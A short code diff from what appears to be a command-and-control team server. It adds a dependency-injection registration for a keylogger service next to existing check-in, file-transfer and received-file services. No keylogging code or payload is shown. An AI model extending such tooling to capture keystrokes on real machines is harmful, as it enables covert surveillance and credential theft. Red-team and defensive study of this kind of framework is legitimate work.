@@ -41,6 +41,7 @@ namespace TeamServer
             builder.Services.AddScoped<DatabaseService>();
             builder.Services.AddScoped<IFileTransferService, FileTransferService>();
             builder.Services.AddScoped<IReceivedFileService, ReceivedFileService>();
+            builder.Services.AddScoped<IKeyloggerService, KeyloggerService>();
 
             // Handlers 
             builder.Services.AddScoped<ICheckinResponseHandler, CheckinResponseHandler>();
